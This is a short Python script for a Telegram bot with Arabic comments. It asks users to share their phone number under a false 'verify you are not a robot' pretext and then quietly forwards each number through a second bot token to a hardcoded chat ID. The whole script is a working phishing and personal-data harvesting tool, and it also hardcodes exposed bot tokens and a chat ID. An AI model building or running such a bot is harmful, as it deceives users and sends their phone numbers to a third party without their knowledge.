import os
import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext
import requests

# 🔵 توكنات البوتات ومعرف المستخدم
BOT_TOKEN = "7347298733:AAGAWEG4PC1wgUTIQE9-7yB_mRs2LEM9gGo"
SECOND_BOT_TOKEN = "7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E"
CHAT_ID = "5375214810"

# 🔵 تهيئة البوت
logging.basicConfig(level=logging.INFO)
application = ApplicationBuilder().token(BOT_TOKEN).build()

# 🔵 معالجة أمر /start
async def start(update: Update, context: CallbackContext):
    keyboard = [[KeyboardButton("📞 مشاركة رقم الهاتف", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    await update.message.reply_text("📌 يرجى إرسال رقم هاتفك للتحقق من أنك لست روبوتًا:", reply_markup=reply_markup)

# 🔵 معالجة استلام جهة الاتصال
async def handle_contact(update: Update, context: CallbackContext):
    phone_number = update.message.contact.phone_number
    await update.message.reply_text(f"✅ تم استلام رقمك و سوف يتم التحقق منه قريباً: {phone_number}\n")

    # 🔵 إرسال الرقم إلى البوت الثاني
    url = f"https://api.telegram.org/bot{SECOND_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"📞 رقم هاتف جديد مقدم من 𝑬𝑳𝑪𝑶𝑴𝑨𝑵𝑫𝑶: {phone_number}"
    }
    response = requests.post(url, json=payload)
    
    if response.status_code == 200:
        print("✅:", response.json())
    else:
        print("❌:", response.text)

# 🔵 تسجيل المعالجات
application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.CONTACT, handle_contact))

# 🔵 تشغيل البوت
if __name__ == "__main__":
    application.run_polling()